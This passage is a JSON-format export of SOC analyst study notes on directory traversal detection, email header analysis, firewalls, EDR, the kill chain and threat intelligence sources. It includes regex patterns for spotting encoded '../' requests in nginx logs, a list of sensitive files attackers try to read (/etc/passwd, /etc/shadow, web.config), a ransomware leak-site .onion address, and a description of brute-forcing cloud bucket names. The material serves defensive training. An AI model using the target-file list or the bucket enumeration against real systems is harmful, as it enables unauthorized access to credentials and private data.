practices: Use secure coding practices, such as avoiding the use of user input directly in file path concatenation, using secure file upload mechanisms, and avoiding the use of insecure functions like eval() and system().\n\n\nWeb application firewall: Use a web application firewall (WAF) to detect and block directory traversal attacks. WAFs can analyze incoming traffic for malicious requests and prevent attacks from reaching the web application.\n\n\nBy following these best practices, web application developers and administrators can reduce the risk of directory traversal attacks and protect their web applications and systems from unauthorized access and data breaches.\nHere’s an example of vulnerable PHP code that is susceptible to directory traversal attacks:\n\nIn this code, the file variable is set to the value of the file parameter from the user’s input. The script then concatenates this value with the document root directory to form a full file path in the $full_path variable. This code is vulnerable to directory traversal attacks because an attacker can include directory traversal sequences like ../ in the file parameter to access files outside of the intended directory.\nHere’s an updated version of the code that uses input validation and sanitization to prevent directory traversal attacks:\n\nIn this updated version of the code, we first validate the input using a regular expression to ensure that the file name only contains alphanumeric characters, underscores, and hyphens. We then use the realpath() function to get the absolute path of the file and check that the resulting path is within the document root directory. This prevents the use of directory traversal sequences like ../ to access files outside of the intended directory. If the file exists, we read and output its contents; otherwise, we output an error message.\nDetecting Directory Traversal Attacks\nIn Part 1, we have overviewed what the directory traversal attack is and how to prevent this attack type. In this part, we’ll have a look at detection techniques and some tips to make it easier. Before the moving on, let’s have a quick look for example payloads for the directory traversal vulnerability;\n\nThese are really basic payloads for directory traversal attacks. So, we should keep in mind ../ (dot dot slash), encoded and double encoded ../ is the key values for this attack type. Here is the basic example for detecting these payloads on nginx access.log file;\n/^.”GET.?.=(%2e%2e%2f).+?.HTTP/.“.$/gm\n\nAs a bypass technique, attackers may also use unicode encode characters to bypass WAF or any other product.\n\nIn that case, Nginx access log will be like;\n\nThese are detection payloads for the Directory Traversal attack. For a successful exploit, attacker needs to access some files. most popular ones are;\nLinux\n\n/etc/issue\n/etc/passwd\n/etc/shadow\n/etc/group\n/etc/hosts\n\nWindows\n\nc:/boot.ini\nc:/inetpub/logs/logfiles\nc:/inetpub/wwwroot/global.asa\nc:/inetpub/wwwroot/index.asp\nc:/inetpub/wwwroot/web.config\nc:/sysprep.inf\n\n\nBasic regex that we have shared above will work with these logs but to prevent False Positive alarms it can be updated more strictly like;\n/^.”GET.?.=(.+?(?=%2e%2e%2fetc%2f)).+?.HTTP/.“.$/gm"},"SOC/SOC-Analyst-Notes/Email-Harvesting":{"slug":"SOC/SOC-Analyst-Notes/Email-Harvesting","filePath":"SOC/SOC Analyst Notes/Email Harvesting.md","title":"Email Harvesting","links":[],"tags":[],"content":"Email harvesting is the process of obtaining email addresses from public, paid, or free services.\nA tool used for email harvesting is: theHarvester."},"SOC/SOC-Analyst-Notes/Email-Header-Analysis":{"slug":"SOC/SOC-Analyst-Notes/Email-Header-Analysis","filePath":"SOC/SOC Analyst Notes/Email Header Analysis.md","title":"Email Header Analysis","links":["SOC/SOC-Analyst-Notes/Phishing","IP-address","mxtoolbox.com"],"tags":[],"content":"Here are the key questions we need to answer when checking headings during a Phishing analysis:\n\nWas the email sent from the correct SMTP server?\nAre the data “From” and “Return-Path / Reply-To” the same?\n\nWas the email sent from the correct SMTP server?\nWe can check the “Received” field to see the path the email took. As you can see in the image below, the email came from the server with the IP address “101[.]99.94.116”.\n\nIf we look at who is sending the mail (“sender”), we can see that it is coming from the domain “letsdefend.io”.\n\nSo, under normal circumstances, “letsdefend.io” should be using “101[.]99.94.116” to send mail. To confirm this, we can query the MX servers that “letsdefend.io” is actively using.”\nMXToolBox will help us by showing you the MX servers used by the domain you are asking for.\n\nIf we look at the image above, the domain “letsdefend.io” uses Google addresses as its email server. So there is no relation with the addresses emkei[.]cz or “101[.]99.94.116”.\nThis examination showed that the email did not come from the original address, but was spoofed.\nAre the ‘From’ and ‘Return-Path / Reply-To’ details the same?\nExcept in exceptional cases, we expect the sender of the email and the recipient of the replies to be the same. Here is an example of how these parts are used differently in Phishing attacks:\nSomeone sends an email (Gmail, Hotmail, etc.) to LetsDefend with the same last name as someone who works for Google, LetsDefend tells the employee that they have issued the invoice and they need to pay to their XXX account. It inserts the real Google employee’s email address in the “Reply-To” field so that the fake email address will not stand out when the email is replied to.\nGoing back to the email we downloaded above, all we need to do is compare the email addresses in the ‘From’ and ‘Reply-to’ sections.\n\nAs you can see, the data is different. In other words, if we want to reply to this email, we will send a reply to the gmail address below. Please note that just because this data is different doesn’t always mean that it’s definitely a Phishing email, we need to look at the event as a whole. In other words, in addition to this suspicious situation, if there’s a malicious attachment, URL, or misleading content in the content of the email, we can understand that it’s a Phishing email."},"SOC/SOC-Analyst-Notes/Email-Header":{"slug":"SOC/SOC-Analyst-Notes/Email-Header","filePath":"SOC/SOC Analyst Notes/Email Header.md","title":"Email Header","links":[],"tags":[],"content":"What is an Email Header?\nThe header is a section of the email containing information such as sender, recipient, and date. There are also components such as ‘Return-Path’, ‘Reply-To’, and ‘Received’. Below you can see the header details of an example email\n\nWhat does the Email Header do?\n1. Allows you to identify the sender and recipient\nThanks to the “From” and “To” fields in the header, you can find out who is sending an email and who is receiving it. If we look at the email above, which you have downloaded in “eml” format, we can see that it was sent from “ogunal@letsdefend.io” to “info@letsdefend.io”.\n\n2. Spam Blocker\nIt is possible to detect spam emails using header analysis and various other methods. This prevents people from receiving SPAM emails.\n3. Allows You to Track an Email’s Route\nIt is important to check the route an email takes to see if it came from the correct address. If we look at the example email above, we can see that it came from the address “ogunal@letsdefend.io”, but it is still not certain whether it came from the domain “letsdefend.io” or from another fake server that imitates the same name. We can use the header information to answer this question.\nImportant Fields\nFrom\nThe ‘From’ field in an Internet header shows the name and email address of the sender.\nTo\nThis field in the mail header contains the details of the recipient of the email, including their name and email address. Such as CC (carbon copy) and BCC (blind carbon copy) also fall under this category, as they all contain details of your recipients.\nTo find out more about carbon copy and blind carbon copy, see How to use CC and BCC.\nDate\nThis is the timestamp showing when the email was sent.\nIn Gmail, it usually follows the format day dd month yyyy hh:mm:ss\nSo if an email was sent on 16 November 2021 at 4:57:23 pm, it would show up as Wed, 16 Nov 2021 16:57:23.\nSubject\nThe subject is the topic of the email. It summarises the content of the entire message body.\nReturn Path\nThis email header field is also known as Reply-To. When you reply to an email, the reply is sent to the address specified in the Return-Path field.\nDomain Key and DKIM Signatures\nDomain Key and Domain Key Identified Mail (DKIM) are email signatures that help email service providers identify and authenticate your emails, similar to SPF signatures.\nMessage-ID\nThe Message-ID header is a unique combination of letters and numbers that identifies each email. No two emails will have the same Message ID.\nMIME-Version\nMultipurpose Internet Mail Extensions (MIME) is an Internet coding standard. It converts non-text content, such as images, videos, and other attachments, into text so that non-text content can be attached to an email and sent via SMTP (Simple Mail Transfer Protocol).\nReceived\nThe Received section lists each mail server that an email has passed through before arriving in the recipient’s inbox. It’s listed in reverse chronological order - the mail server at the top is the last server the email message passed through, and the mail server at the bottom is where the email originated.\nX-Spam Status\nThe X-Spam Status shows you the spam score of an email message.\nFirst, it’ll highlight if a message is classified as spam.\nIt then shows the spam score of the email and the spam threshold for the email.\nAn email can either meet or exceed an inbox’s spam threshold. If it’s too spammy and exceeds the threshold, it’s automatically classified as spam and sent to the Spam folder.\nHow to Access Email Header?\nGmail\n1. Open the email in question\n2. Click on the 3 dots at the top right ”…“\n3. Click on the “Download message” button.\n\n4. Open the downloaded file with the extension “.eml” with any notebook application\nOutlook\n1. Open the email in question\n2. File → Info → Properties → Internet headers\n\n"},"SOC/SOC-Analyst-Notes/Email-Security-Solutions":{"slug":"SOC/SOC-Analyst-Notes/Email-Security-Solutions","filePath":"SOC/SOC Analyst Notes/Email Security Solutions.md","title":"Email Security Solutions","links":[],"tags":[],"content":"What is Email Security Solution?\nEmail Security Solutions is one of the security solutions that provides security against threats that may come via e-mail. It can be software or hardware-based products.\nFunctions of Email Security Solution\n\nEnsuring the security control of the files in the email\nEnsuring security checks of URLs in the email\nDetection and blocking of spoofed emails\nBlocking known harmful emails\nBlocking email addresses with malicious content detected\nTransmitting information about harmful e-mail content to the relevant product or manager as a warning\n\n\nThe Importance of Email Security Solutions for Security\nPhishing, which is the most popular attack method today, is a major threat to corporate and individual users. The consequences of phishing attacks, which aim to collect information about organizations or individuals by using the vulnerability of the human factor, or to harm the target, can sometimes be very severe. Therefore, threats that may come via email should never be taken lightly. It is necessary to verify that the files and links sent in the email are secure, and not malicious. At this point, the importance of email security solutions that offer comprehensive security measures emerges. Like other security products, email security solutions are not enough to provide security alone, but they are an important component in ensuring security. Its main purpose is to prevent malicious emails from reaching the end user by automatically analyzing incoming emails.\nSome popular Email Security Solutions products used within the cyber security industry are as follows:\n\nFireEye EX\nIronPort\nTrendMicro Email Security\nProofpoint\nSymantec\n"},"SOC/SOC-Analyst-Notes/Endpoint-Detection--and--Response-(EDR)":{"slug":"SOC/SOC-Analyst-Notes/Endpoint-Detection--and--Response-(EDR)","filePath":"SOC/SOC Analyst Notes/Endpoint Detection & Response (EDR).md","title":"Endpoint Detection & Response (EDR)","links":[],"tags":[],"content":"What is EDR?\nEndpoint Detection and Response (EDR) is a security product that is installed on endpoint-qualified devices, constantly monitors the activities in the system, tries to detect security threats such as ransomware &amp; malware, and takes action against malicious activities.\nEndpoint Devices\nExamples of endpoint devices are:\n\nEDR Core Components\nEDR products can perform many different operations on the endpoint device. These are the processes that support each other to ensure the security of the device. EDR core components are as follows:\n\nEndpoint data collection agents\nAutomated response\nAnalysis and forensics\n\nFunctions of EDR\nThe duties of EDR products are generally as follows:\n\nMonitoring and collecting each process on the device that may identify a security threat\nAnalyzing the behavior of threat actors according to the data collected on the device\nInforming the relevant analyst by taking the appropriate security action against the threat actor obtained from the collected data.\nAllow forensic analysis on the device to conduct in-depth investigation of suspicious activities\n\nThe Importance of EDR for Security\nEnsuring the security of the devices that EDR products need to protect has become an essential element to be considered today. Because attackers aim to gain access to the network by turning to weak devices in terms of security. After gaining access to the network through an endpoint, the attacker tries to access more critical systems. In this way, if there is an endpoint that does not have an EDR product installed and is not sufficiently secure, it can be used by the attacker for initial access.\nSome popular EDR products used within the cybersecurity industry are as follows:\n\nSentinelOne\nCrowdstrike\nCarbonBlack\nPalo Alto\nFireEye HX\n\nWhat log sources does EDR have?\nEDR product keeps some information as a log by monitoring the system on which it is installed. The processes running on the system are monitored and the names of the files accessed by the programs and their access information are recorded by EDR as logs. It records which programs are run, which files the run programs read, or which file they make changes to. Each EDR can obtain various information through the system. In general, it can be said that the EDR product monitors and logs the sections deemed necessary in terms of security.\nFor example, in the image below, it is seen that the endpoint security product lists the processes on the device:\n\nEndpoint security product provides some information about the processes it lists to the user. Some of this information is size information, hash information, and path information, as seen in the image above."},"SOC/SOC-Analyst-Notes/Fast-Flux":{"slug":"SOC/SOC-Analyst-Notes/Fast-Flux","filePath":"SOC/SOC Analyst Notes/Fast Flux.md","title":"Fast Flux","links":["Networking/DNS","SOC/SOC-Analyst-Notes/Phishing","SOC/SOC-Analyst-Notes/C2"],"tags":[],"content":"Fast Flux is a DNS technique used by botnets to hide Phishing, web proxying, malware delivery, and malware communication activities behind compromised hosts acting as proxies.\nThe purpose of using the Fast Flux network is to make the communication between malware and its command and control server (C2) challenging to be discovered by security professionals."},"SOC/SOC-Analyst-Notes/Firewall":{"slug":"SOC/SOC-Analyst-Notes/Firewall","filePath":"SOC/SOC Analyst Notes/Firewall.md","title":"Firewall","links":["OSI-model","Networking/TCP","Networking/NAT"],"tags":[],"content":"What is Firewall?\nA firewall is a security software or hardware that monitors incoming and outgoing network traffic according to the rules it contains and allows the passage of network packets or prevents the passage of packets according to the nature of the rule.\nTypes of Firewall\nA firewall is divided into many different types according to its features:\nApplication-Level Gateways (Proxy Firewalls)\nApplication-Level Gateways (Proxy Firewalls) are a type of firewall that functions at the application layer between two end systems. Unlike basic firewalls, it captures and analyzes packets in the application layer according to the OSI model. In this way, it works as an additional security measure on the application layer.\nCircuit-Level Gateways\nCircuit-Level Gateways are a type of firewall that can be easily configured, has low resource consumption, and has a simplified structure. These types of firewalls verify TCP connections and sessions and operate in the session layer of the OSI model.\nCloud Firewalls\nCloud Firewalls are the type of firewall used when the institution receives firewall service over the cloud as a service. Another name is “FWaaS” (firewall-as-a-service). There are some advantages to using a cloud firewall. For example, cloud firewalls have no physical resources, so they can be easily reconfigured based on demand or traffic load. Additional capacity can be added to accommodate increased traffic.\nEndpoint Firewalls\nEndpoint Firewalls are a type of host-based firewall installed on devices. It is a type of firewall that is often difficult to manage. It is an important component that must be used to ensure security. For example, the “Windows Defender Firewall”, which comes pre-installed in Windows, is an example of this type of firewall.\nNetwork Address Translation (NAT) Firewalls\nNetwork Address Translation (NAT) Firewalls are a type of firewall designed to access internet traffic and block unwanted connections. Such firewalls are used to hide the IP addresses in the internal network from the external network. In other words, it is the firewall where NAT is applied.\nNext-Generation Firewalls (NGFW)\nNext-Generation Firewalls (NGFW) are a type of firewall that combines the features of different firewalls available under the conditions of that day on a single firewall. These firewalls have a deep-packet inspection (DPI) feature. This type of firewall is designed to block external threats, malware attacks, and advanced attack methods.\nPacket-Filtering Firewalls\nPacket-Filtering Firewalls are the most basic type of firewall. It has a feature that monitors network traffic and filters incoming packets according to configured rules. A packet-Filtering firewall blocks the destination port if the incoming packet does not match the rule set. This firewall is one of the quick solutions that can be used without many resource requirements. But there are also some disadvantages. For example, it lacks the ability to block web-based attacks.\nStateful Multi-Layer Inspection (SMLI) Firewalls\nStateful Multi-Layer Inspection (SMLI) Firewall is a type of firewall capable of both packet inspection and TCP handshake verification. With these features, it stands out from other firewalls. It also has the feature of tracking the status of established connections.\nThreat-Focused NGFW\nThreat-Focused NGFW has all the features of an NGFW-type firewall. In addition, it has advanced threat detection features. Thanks to this feature, it can react quickly to attacks. It helps to provide security more effectively thanks to the rules written with a threat focus. Since it monitors every malicious activity from beginning to end, it runs the process faster by shortening the time from the first time it detects the threat to the cleaning phase.\nUnified Threat Management (UTM) Firewalls\nUnified Threat Management (UTM) Firewalls are a special type of stateful inspection firewalls with antivirus and intrusion prevention.\nHow Firewall Works\nAlthough there are many types of firewall devices, they basically work with the same logic. Some rules are needed for a firewall to work. The firewall rule is the part that is checked to decide whether to allow or block the passage of network packets coming to the firewall. For example, firewall rules can be created to prevent two departments from accessing each other’s network within an organization. In this way, a kind of network segmentation is provided and security is increased by interrupting the communication of devices that do not need to communicate with each other. The working principle of a Firewall is basically as follows:\n\nHow the firewall manages network packets by rules is shown below:\n\nAs can be seen above, the passage of incoming packets is allowed or the passage of packets is blocked according to the details in the rules.\nImportance of Firewall for Security\nA firewall is one of the most basic security solutions that should be included in a network. It would not be right to talk about the complete security of a corporate network without a firewall. In addition to being in the existing network, it is also very important that the firewall is correctly configured and managed. It is not possible to protect the network or related host from attacks using only a firewall.\nSome popular Firewall products used in the cybersecurity industry are as follows:\n\nFortinet\nPalo Alto Networks\nSonicWall\nCheckpoint\nJuniper\npfsense\nSophos\n\nWhat log resources does Firewall have?\nFirewall products have logs about network flow because they do network-based filtering. For example, below is some information from firewall logs:\n\nDate/Time information\nSource IP Address\nDestination IP Address\nSource Port\nDestination Port\nAction Information\nNumber of Packets Sent\nNumber of Packets Received\n\nPhysical Location of Firewall Device\nFirewall devices can be located in different places in the network according to their types. For example, the host-based firewall is used to filter inbound/outbound traffic in front of that host. If we consider a corporate network in general terms, a firewall should be located at the interfaces of the institution that go to the internet or at the external interface. The device that will meet the packets coming from the internet even before they come to the IDS / IPS devices is the firewall device.\n"},"SOC/SOC-Analyst-Notes/Gaining-Initial-Foothold":{"slug":"SOC/SOC-Analyst-Notes/Gaining-Initial-Foothold","filePath":"SOC/SOC Analyst Notes/Gaining Initial Foothold.md","title":"Gaining Initial Foothold","links":["SOC/SOC-Analyst-Notes/Reconnaissance","reverse-shell"],"tags":[],"content":"\n1. Reconnaissance\nReconnaissance is the first step and it provides adversary with all the info needed for getting into a system. It is described in more detail in Reconnaissance page.\n2. Weaponization \n(MITRE Tactic TA0001)\nThis phase of the UKC describes the adversary setting up the necessary infrastructure to perform the attack. For example, this could be setting up a command and control server, or a system capable of catching reverse shells and delivering payloads to the system.\n3. Social Engineering\n(MITRE Tactic TA0001)\nThis phase of the UKC describes techniques that an adversary can employ to manipulate employees to perform actions that will aid in the adversaries attack. For example, a social engineering attack could include:\n\nGetting a user to open a malicious attachment.\nImpersonating a web page and having the user enter their credentials.\nCalling or visiting the target and impersonating a user (for example, requesting a password reset) or being able to gain access to areas of a site that the attacker would not previously be capable of (for example, impersonating a utility engineer).\n\n4. Exploitation \n(MITRE Tactic TA0002)\nThis phase of the UKC describes how an attacker takes advantage of weaknesses or vulnerabilities present in a system. The UKC defines “Exploitation” as abuse of vulnerabilities to perform code execution. For example:\n\nUploading and executing a reverse shell to a web application.\nInterfering with an automated script on the system to execute code.\nAbusing a web application vulnerability to execute code on the system it is running on.\n\n5. Persistence\n(MITRE Tactic TA0003)\nThis phase of the UKC is rather short and simple. Specifically, this phase of the UKC describes the techniques an adversary uses to maintain access to a system they have gained an initial foothold on. For example:\n\nCreating a service on the target system that will allow the attacker to regain access.\nAdding the target system to a Command &amp; Control server where commands can be executed remotely at any time.\nLeaving other forms of backdoors that execute when a certain action occurs on the system (i.e. a reverse shell will execute when a system administrator logs in).\n\n6. Defense Evasion\n(MITRE Tactic TA0005)\nThe “Defense Evasion” section of the UKC is one of the more valuable phases of the UKC. This phase specifically is used to understand the techniques an adversary uses to evade defensive measures put in place in the system or network. For example, this could be:\n\nWeb application firewalls.\nNetwork firewalls.\nAnti-virus systems on the target machine.\nIntrusion detection systems.\n\nThis phase is valuable when analyzing an attack as it helps form a response and better yet - gives the defensive team information on how they can improve their defence systems in the future.\n7. Command &amp; Control\n(MITRE Tactic TA0011)\nThe “Command &amp; Control” phase of the UKC combines the efforts an adversary made during the “Weaponization” stage of the UKC to establish communications between the adversary and target system.\nAn adversary can establish command and control of a target system to achieve its action on objectives. For example, the adversary can:\n\nExecute commands.\nSteal data, credentials and other information.\nUse the controlled server to pivot to other systems on the network.\n\n8. Pivoting\n(MITRE Tactic TA0008)\n“Pivoting” is the technique an adversary uses to reach other systems within a network that are not otherwise accessible (for example, they are not exposed to the internet). There are often many systems in a network that are not directly reachable and often contain valuable data or have weaker security.\nFor example, an adversary can gain access to a web server that is publicly accessible to attack other systems that are within the same network (but are not accessible via the internet)."},"SOC/SOC-Analyst-Notes/Gathering-Threat-Intelligence":{"slug":"SOC/SOC-Analyst-Notes/Gathering-Threat-Intelligence","filePath":"SOC/SOC Analyst Notes/Gathering Threat Intelligence.md","title":"Gathering Threat Intelligence","links":[],"tags":[],"content":"One of the most important things when collecting threat intelligence is to keep the range of sources from which data is collected as wide as possible. For example, when collecting malicious hashes, it is useful to collect them from as many sources as possible. In addition, in order not to increase the false positive rate while expanding the sources, we can set a false positive limit value and apply false positive filters to the collected sources. This way we can remove the sources that bring high false positive values from our intelligence sources. We will briefly talk about the most popular sources where we can collect threat intelligence data and their possible equivalents:\nShodan\nShodan is a web-based server search engine. It is one of the most popular search engines of its kind, where users can search for systems open to the internet with certain filters. Searches related to an organization or a country may be conducted through Shodan worldwide. Shodan has a flexible structure that can be shaped in any direction we want to use it. For example, we can detect all the systems of a specific country or an organization with port# 21 that are open to the internet via shodan. Usage examples will be explained in detail in the following sections.\n\nMany data can be accessed instantly by searching the interface on Shodan. Also, we may need to pull the data through the API as collecting intelligence manually is not possible.\n\nYou can access the api documentation at developer.shodan.io/api and see how data can be retrieved via the API.\nOther search engines alternative to Shodan are “BinaryEdge”, “Zoomeye”, and “Censys”.\nResources Providing IOCs\nCollecting IPs, domains, hashes, and C2s is one of the most important methods to protect from potential attacks. Collecting these artifacts that belong to newly emerged threat actors allows us to detect these malicious actors and protect our systems before they are infected and also to take early actions when an activity related to these IOCs is observed in our systems.\nResources such as Alienvault, Malwarebazaar, Abuse.ch, Malshare, Anyrun, Virustotal, Hybrid-Analysis, Totalhash, Phishunt, Spamhaus, Tor Exit Nodes, Urlscan, Zone-h, Rats, Sorbs, Barracuda and many more can provide us with IOCs. One of the most basic rules here is to have a list of sources as wide as possible and to pull data from these sources as often as possible. Almost all of the sources that provide IOC provide data via API. Just like Shodan, we can pull data from these sources via API and then reach the lowest possible false positive rate through some data elimination methods like whitelisting, etc.\nHacker Forums\nHacker forums are one of the most important places to gather intelligence. Threat actors usually share in hacker forums first when they are in preparation for an attack or before they launch a campaign against an organization or a country. By analyzing the posts they made in these forums, we can find answers to critical questions such as the direction of the attack, the targets, the methods to be used in the attack, and who is behind the attack.\nSometimes, sales of access to hacked systems are common on these forums. In such cases, even if we are compromised, the remediation issues such as closing the access to our systems outside of our network, to avoid the access of more dangerous people and determining the root cause of the incident should be addressed. Below are screenshots of content shared on hacker forums:\n\n\n\n\n\n\n\n\n\nRansomware Blogs\nRansomware blogs are one of the sources that have gained popularity with the start of the Covid-19 pandemic. Ransomware groups have ramped up their activities as of 2020 and started posting the data of their victims who refused to pay on their blogs. In addition, they have been making their announcements through these blogs. These blogs should definitely be resources that we should monitor closely to find answers to questions such as which organization is targeted by which group, which groups are targeting which countries, what their motivations are, and to gather more intelligence on ransomware groups. Some of the most popular ransomware groups today are; Lockbit, Conti, Revil, Hive, Babuk. You can view the active ransomware groups from the link below and view the links to their blogs:\nransomwr3tsydeii4q43vazm7wofla5ujdajquitomtd47cxjtfgwyyd.onion/\nWe need to install the Tor Browser to be able to visit the sites with the .onion extensions as .onion extensions are not accessible via regular browsers. Tor Browser can be downloaded from torproject.org.\nBelow are some screenshots from ransomware blogs:\n\n\n\nBlack Markets\nBlack Markets are like more systematized versions of the posts in the “Selling” categories in the hacker forums. In black markets, credit cards, stealer logs, RDP accesses, and prepaid accounts are generally sold.\nSince the data to be collected from here contains limited information, it will not have an actionable output on its own. However, as explained before, if an attack surface has been created and if the collected data matches any data on the attack surface, then it will produce an actionable output. As black markets don’t provide data via API, we can extract data from the black markets only by sending requests with scripts we write and by parsing the returned requests. Below are screenshots from some black markets.\n\n\n\n\nChatters\nPlatforms, where bilateral or multiple written, and audio-visual communications are possible, are important in terms of threat intelligence. Threat actors may share sensitive data throughout their communications with each other on these chatters or important information or documents regarding the preparation of an attack may be disclosed. This is why we should follow the chatters as possible as we can and record everything on those chatters into our database as much as possible. Today, popular chatters frequently used by threat actors are applications such as Telegram, ICQ, IRC, and Discord. It is possible to see posts selling credit cards, accounts, and sales for direct access to companies on some groups on these platforms. Below are screenshots of some chatters.\n\n\nCode Repositories\nCode Repositories are full of sensitive data that has been forgotten in them. Organizations or individual users may forget database access information, login information, sensitive configuration files for their applications, secret API keys, etc. in the code repositories. This information may sometimes be detected by malicious actors and leveraged in their attacks. Therefore, monitoring public code repositories is important from the threat intelligence perspective. In addition, when a new vulnerability is announced, its exploit is often uploaded to these code repositories and it is important to identify them. Github, Gitlab, and Bitbucket are some of the popular code repository applications. It is possible to find sensitive data when searching with certain parameters in these applications. For example, let’s search for “password” “abanca.com” in github.\n\nAs the screenshots show, we have 40 results for our search for “password” and “abanca.com” keywords. When we review these results we clearly see that the secret API key of Abanca is left open in the second file.\n\nThis information may belong to the organization or a third party that provides services, but either way, it is obvious that it is highly risky that this data is open in this way.\nFile Share Websites\nFile share sites are applications that many threat actors use actively. They can share files anonymously through these sites. Files uploaded on these platforms do belong to a specific organization, sometimes to a country. Confidential documents of these organizations may be distributed through these file share sites in case of a breach of these organizations. Monitoring of these sites is important from the threat intelligence aspect as we will be aware of the shares about an organization that we follow. Thus, if there is a breach, it can be detected as early as possible. Popular sites that allow file uploading anonymously are sites such as Anonfiles, Mediafire, Uploadfiles, WeTransfer, File.io. We cannot download files from these sites directly, therefore, we need to use different methods other than API to extract data from them. There are 2 different methods to download data from these sites. First, before guessing the file name on such sites, we detect the unique keys produced for that file through the guessing algorithm, and then by sending a request to the application server with that key we can retrieve the file in the returned response. This method is costly because it requires large processing power. The second method is a simpler method with a very low cost. When you upload any file to these sites as public, it is observed that browsers index these files after a while. These indexed files can be captured and pulled to our own servers by using Dork through a script. Dork is queries that allow us to search more effectively and quickly.\nPublic Buckets\nBucket applications are cloud-based environments that organizations or individuals use to store their data. These environments should be closed to the outside of the network and only the authorized users of the organization should access them. But this is not the case all the time and these environments may be left wide open which causes the disclosure of sensitive and confidential data. For this reason, buckets left as the public have been an important source of threat intelligence. In order to detect these public buckets and to find the endpoints, brute force attempts can be made. Let’s say there is a structure named “bucketname.amazonaws.com”, we can detect existing buckets by brute force in the bucket name field in this structure, and then search for files under that endpoint. It is sufficient to have a wordlist containing the names of the organization for this. Popular applications include Amazon S3 Buckets, Azure Blobs, and Google Cloud Storage.\nHoneypots\nHoneypots are one of the most effective ways to catch the attackers. Systems that are easy to breach are very attractive to attackers. Honeypots are basically systems with security vulnerabilities that are not connected to any critical server or system that works with the logic of trapping. It is intended for attackers to attack honeypots so we can actively collect IOCs such as attacker IPs and use them in our own systems. If we wish, we can build our own honeypot or we can use popular honeypots that are already active. Kippo, Cowrite, Glastopf, Nodepot, Google Hack Honeypot, ElasticHoney, Honeymail are some of the popular honeypots.\nSIEM/IDS/IPS/Firewalls\nAn institution may receive hundreds of attacks per day and these attacks may be prevented by the written rules on the security products used. One of the most effective sources of intelligence is the logs of these security products. The logs collected in SIEM or the logs containing the blocked IP addresses of the firewall will give us good information about the attackers. We can obtain the list that contains the attacker’s IPs by filtering these logs. Also, the hash of a malicious file captured on the SIEM is intelligence for us. It will always keep us one step ahead if we see the products we use within the organization as critical resources and use them effectively by creating rules and scripts to collect data from these sources."},"SOC/SOC-Analyst-Notes/Hash":{"slug":"SOC/SOC-Analyst-Notes/Hash","filePath":"SOC/SOC Analyst Notes/Hash.md","title":"Hash","links":[],"tags":[],"content":"A hash value is a numeric value of a fixed length that uniquely identifies data. It is the result of a hashing algorithm.\nCommon Hash Types\nMD5\n(Message Digest, defined by RFC 1321\nMD5 is a widely used cryptographic hash function with a 128-bit hash value. MD5 hashes are NOT considered cryptographically secure. In 2011, the IETF published RFC 6151, “Updated Security Considerations for the MD5 Message-Digest and the HMAC-MD5 Algorithms,” which mentioned a number of attacks against MD5 hashes, including the hash collision.\nSHA-1\n(Secure Hash Algorithm 1, defined by RFC 3174)\nWhen data is fed to SHA-1 Hashing Algorithm, SHA-1 takes an input and produces a 160-bit hash value string as a 40 digit hexadecimal number. NIST deprecated the use of SHA-1 in 2011 and banned its use for digital signatures at the end of 2013 based on it being susceptible to brute-force attacks. Instead, NIST recommends migrating from SHA-1 to stronger hash algorithms in the SHA-2 and SHA-3 families.\nSHA-2\n(Secure Hash Algorithm 2)\nSHA-2 Hashing Algorithm was designed in 2001 to replace SHA-1. SHA-2 has many variants, and arguably the most common is SHA-256. The SHA-256 algorithm returns a hash value of 256-bits as a 64 digit hexadecimal number."},"SOC/SOC-Analyst-Notes/How-Web-Applications-Work":{"slug":"SOC/SOC-Analyst-Notes/How-Web-Applications-Work","filePath":"SOC/SOC Analyst Notes/How Web Applications Work.md","title":"How Web Applications Work","links":["Networking/TCP"],"tags":[],"content":"HTTP Requests\nAn HTTP request is used to retrieve a specific resource from a web server. The web server’s job is to process the response received and present it to the user.\nAll requests must conform to a standard HTTP format so that web servers can understand the request. If the request is sent in a different format, the web server will not recognize it and will return an error to the user, or the web server may not be able to provide service (which is another type of attack).\n\nAn HTTP request consists of a request line, request headers, and a request message body. The request line consists of the HTTP method and the resource requested from the web server.\nThe request headers contain certain headers that the server will process.\nThe request message body contains the data to be sent to the server.\nThe image above shows an example of an HTTP request. Let’s examine this HTTP request line by line.\n\n\nThe GET method indicates that the resource ”/” is being requested from the server. Because there is no name, a symbol like ”/” means that the main page of the web server is being requested.\n\n\nNowadays there are web applications that belong to more than one domain found on a single web server, so browsers use the “Host” header to identify which domain the requested resource belongs to.\n\n\nWhen a web application wants to store information on the client’s device, it stores it in a “cookie” header. Cookies are typically used to store session information. This saves you from having to re-enter your username and password when you visit a web application that requires you to log in.\n\n\nThe “Upgrade-Insecure-Requests” header indicates that the client wants to communicate using encryption (SSL).\n\n\nThe “User-Agent” header contains information about the client’s browser and operating system. Web servers use this information to send specific HTTP responses to the client. You can find some automated vulnerability scanners by looking under this header.\n\n\nThe type of data requested is in the “Accept” header.\n\n\nThe type of encoding accepted by the client is found in the “Accept-Encoding” header. You can usually find the names of compression algorithms under this header.\n\n\nThe “Accept-Language” header contains the client’s language information. The web server uses this information to display the prepared content in the client’s language.\n\n\nThe “Connection” header shows how the HTTP connection is made. If there is data such as “close”, it means that the TCP connection will be closed after receiving the HTTP response. If you see “keep-alive”, this means that the connection will be maintained.\n\n\nAn empty line is inserted between the HTTP request header and the HTTP request message body to create a partition.\n\n\nAny other data to be sent to the web application is in the Request Message Body. If the HTTP POST method is used, then the POST parameters can be found here.\n\n\nHTTP Responses\nWhen the web server receives an HTTP request, it performs the necessary checks and processes and then sends the requested resource to the client. There is no standard process, as there are many technologies and designs involved. The server may pull data from the database depending on what the requested resource is, or it may process the incoming data. However, the HTTP Response Message must reach the client after all the processing.\nAn HTTP response message contains a Status Line, Response Headers, and a Response Body.\n\nThe Status line contains the status code (e.g. 200: OK) and HTTP protocol information.\nThe Response Header has some headers are used for a variety of purposes.\nThe Response Body contains information about the requested resource.\n\nIf a web page has been requested, there will usually be HTML code in the Response Body. When the client receives the HTML code, the web browser will process the HTML code and display the web page.\n\nLet’s examine an HTTP response request using this image.\nStatus Line\nThe Status Line contains information about the HTTP version and the HTTP Response Status Code. The HTTP Response Status Code is used to describe the status of the request. There are many HTTP response status codes, but they can be summarized as follows:\n-      100-199: Informational responses\n-      200-299: Successful responses\n-      300-399: Redirection message\n-      400-499: Client error responses\n-      500-599: Server error responses\nResponse Headers\nHere are some HTTP Response Headers that you may encounter frequently:\n-      Date: The exact time the server sent the HTTP Response to the client.\n-      Connection: This indicates how the connection is handled, just like the HTTP Request header.\n-      Server: It informs about the operating system of the server and the version of the web server.\n-      Last-Modified: It provides 